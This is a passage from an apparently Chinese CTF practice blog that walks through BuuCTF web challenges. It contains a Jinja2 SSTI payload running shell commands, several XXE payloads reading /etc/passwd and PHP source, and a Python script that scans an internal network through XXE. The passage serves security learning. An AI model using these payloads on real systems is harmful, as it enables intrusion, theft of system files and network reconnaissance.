class="hljs-keyword">if</span>(secret==<span class="hljs-literal">None</span>):<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br>   rc=rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment">#è§£å¯†ï¼Œè¿™ä¸ªç®—æ³•åº”è¯¥æ˜¯RC4,ç„¶åå¯†é’¥æ˜¯HereIsTreasure</span><br>   deS=rc.do_crypt(secret) <span class="hljs-comment"># åŠ å¯†secret</span><br><br>   a=render_template_string(safe(deS)) <span class="hljs-comment"># deSç»è¿‡safeè¿‡æ»¤ç„¶åæ¸²æŸ“</span><br><br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> a.lower():<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br>   <span class="hljs-keyword">return</span> a<br></code></pre></td></tr></table></figure><p>å¥‡æ€ªçš„æ˜¯<code>rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)</code>çš„æ³¨é‡Šæ˜¯è§£å¯†ï¼Ÿ</p><p><code>RC4</code>æ‰¾äº†ä¸ªç½‘ç«™ï¼š<code>http://tool.chacuo.net/cryptrc4</code>ï¼Œè¿™ä¸ªç»“æœæ˜¯ä¸€è‡´çš„(æœ‰äº›è™½ç„¶ä¹Ÿæ˜¯<code>RC4</code>ä½†ç»“æœä¸ä¸€æ ·)ï¼šæ•°æ®åŠ å¯†åæ˜¯<code>base64</code>ç¼–ç ï¼Œç„¶åæŠŠå®ƒè§£ç å°±è¡Œäº†ã€‚</p><p>åé¢çœ‹wpå‘ç°æœ‰å¤§ä½¬ç›´æ¥è‡ªå·±å†™è„šæœ¬ã€‚ã€‚å¤ªå¼ºäº†orzï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>):<span class="hljs-comment">#è¿”å›åŠ å¯†åå¾—å†…å®¹</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#æ­¤å¤„ä¸ºå¯†æ–‡</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æ˜æ–‡:\n&quot;</span>)<br>enc_base64 = rc4_main( key , message )<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4åŠ å¯†åçš„urlç¼–ç :&quot;</span>+enc_url)<br></code></pre></td></tr></table></figure><p>ä»–è¿™ä¸ªåŠ å¯†è¿‡ç¨‹å¤§è‡´æ˜¯æˆ‘ä»¬çš„è¾“å…¥<code>secret</code>ç»è¿‡<code>RC4</code>åæ˜¯<code>base64</code>ç¼–ç ï¼Œç„¶åæ¸²æŸ“è¾“å‡º<code>base64</code>è§£ç çš„ç»“æœã€‚</p><p>å­˜åœ¨<code>render_template_string</code>ï¼Œå‚æ•°åˆæ˜¯å¯æ§çš„ï¼ŒçŒœæµ‹æ˜¯<code>SSTI</code>ã€‚</p><p>æˆ‘ä»¬éœ€è¦è®©å®ƒ<code>render_template_string</code>çš„å‚æ•°æ˜¯<code>payload</code></p><p>å…ˆè¯•è¯•<code>&#123;&#123;config&#125;&#125;</code>:<code>.%14ZZ%C2%A4%01%02iv%C2%80</code></p><p><img src="/img/doublesecret5.png" alt="doublesecret5"></p><p>åŠ å¯†ï¼š</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p><p><code>/secret?secret=.J%19SÂ¥%15Km%2B%C2%94Ã–S%C2%85%C2%8FÂ¸%C2%97%0B%C2%90X5Â¤AÃŸMDÂ®%07%C2%8BSÃŸ7Ã˜%12Ã…rÃ©%1BÃ¤*Ã§wÃ›%C2%9EÃ±h%1D%C2%82%25Ã­Ã´%06)%7FÃ°o%2C%C2%9E9%08Ã‡Ã·u.Ã»%C2%95%14Â¿v%05%19jÂ®LÃš-Ã£tÂ¬%7FX%2C8L%C2%81Ã‘HÃ¿Ã¶Ã£ÃšÃµ%C2%9AÂ¦%23%06Â§Â¸Â»Â¹Ã¦nyÃ˜ÃŠjÂ»%25X%15Ã—%C2%84F%24%1As^%C2%9BÃ—Â¤ jÂ¥/%17%1CÃŸsÂ¯6Ã…Â¥Â±.Ã¨Â¢Y!Â¨Ã %10%C2%8Aa]\%2BÃÂ°%C2%99Ã Â¾%C2%87-%10x ]Ãš%0B%C2%882PÃ£Ãœ%1A%3A%3FÃ¦Â² Â¢Ã‚Â¹%0F%0BÃ•G%23-Ã©Â¢%19Ã…Â²%C2%8F&quot;Ã®Â£%C2%93lÃŠ&#123;%03Ã¹Â¶%C2%92Ã—%11 ÃœÃ®Ãª%02`![doublesecret4](img/doublesecret4.png)æ„Ÿè§‰`safe`è¿‡æ»¤æ²¡å•¥ç”¨ï¼Œåªä¼šæç¤º`xxx is not allowed`ï¼Œè¯¥æ‰§è¡Œè¿˜æ˜¯ä¼šæ‰§è¡Œè¯»`flag.txt`:`&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p><p><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</code></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>å…ˆçœ‹æºç ï¼š</p><p><img src="/img/truecookbook1.png" alt="truecookbook1"></p><p>ç›´æ¥è®¿é—®ï¼Œä½†ï¼š</p><p><img src="/img/truecookbook2.png" alt="truecookbook2"></p><p>æ²¡æ³•è®¿é—®ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è¦ä¼ ä¸œè¥¿è¿›å»</p><p>æŠ“åŒ…ï¼š</p><p><img src="/img/rutecookbook4.png" alt="rutecookbook4"></p><p>è¯·æ±‚ä¸å“åº”åŒ…çš„æºå¸¦çš„æ•°æ®éƒ½æ˜¯<code>XML</code>æ ¼å¼ï¼Œå¹¶ä¸”è¿”å›åŒ…ä¸­çš„<code>msg</code>æ ‡ç­¾å€¼ä¸è¯·æ±‚åŒ…ä¸­çš„<code>username</code>æ ‡ç­¾å€¼ç›¸åŒã€‚å°è¯•ä½¿ç”¨<code>XXE</code>ï¼Œæ•°æ®æ³¨å…¥ç‚¹åœ¨<code>username</code>æ ‡ç­¾ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/truecookbook5.png" alt="truecookbook5"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/truecookbook6.png" alt="truecookbook6"></p><p>ä¼ªåè®®è¯»<code>doLogin.php</code>(è·¯å¾„æ ¹æ®ä¹‹å‰çš„æŠ¥é”™)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//è´¦å·</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="hljs-comment">//å¯†ç </span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„<code>wp</code>ï¼Œè¿™é‡Œä¸»è¦æ˜¯ç”¨<code>XXE</code>è¿›è¡Œå†…ç½‘æ‰«æå»æ‰¾å­˜æ´»ä¸»æœº(å¯ä»¥æ¢æµ‹å†…ç½‘)<code>https://xz.aliyun.com/t/3357#toc-11</code>ã€‚</p><p>å¯èƒ½è·å–åˆ°å†…ç½‘ipçš„æ•æ„Ÿæ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>network/interfaces<br><span class="hljs-regexp">/etc/</span>hosts<br><span class="hljs-regexp">/proc/</span>net/arp<br><span class="hljs-regexp">/proc/</span>net/tcp<br><span class="hljs-regexp">/proc/</span>net/udp<br><span class="hljs-regexp">/proc/</span>net/dev<br><span class="hljs-regexp">/proc/</span>net/fib_trie<br></code></pre></td></tr></table></figure><p>å°è¯•ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/proc/net/fib_trie&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/xxewhat2.png" alt="xxewhat2"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å‚è€ƒï¼šhttps://www.cnblogs.com/Article-kelp/p/16026652.html</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br>url=<span class="hljs-string">&quot;http://e28cd6e3-3ea2-4656-ae5c-e267a4e7b8cd.node4.buuoj.cn:81/doLogin.php&quot;</span><br>rawPayload=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;]&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;user&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&amp;payload1;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;23&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/user&gt;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):<br>    payload=rawPayload.<span class="hljs-built_in">format</span>(i)<br>    <span class="hljs-comment">#payload=rawPayload</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="hljs-built_in">format</span>(i),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        resp=res.post(url,data=payload,timeout=<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(resp.text,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/xxewhat1.png" alt="xxewhat1"></p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_5</title>
    <link href="/2023/11/29/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_5/"/>
    <url>/2023/11/29/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_5/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="çº¢æ˜è°·æ¯2021-write-shell"><a href="#çº¢æ˜è°·æ¯2021-write-shell" class="headerlink" title="[çº¢æ˜è°·æ¯2021]write_shell"></a>[çº¢æ˜è°·æ¯2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123; <span class="hljs-comment">//è¿™ä¸œè¥¿è¯´ç™½äº†å°±æ˜¯ä¸€å±‚ä¸€å±‚å»æ£€æµ‹è¾“å…¥çš„å†…å®¹</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125; <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span 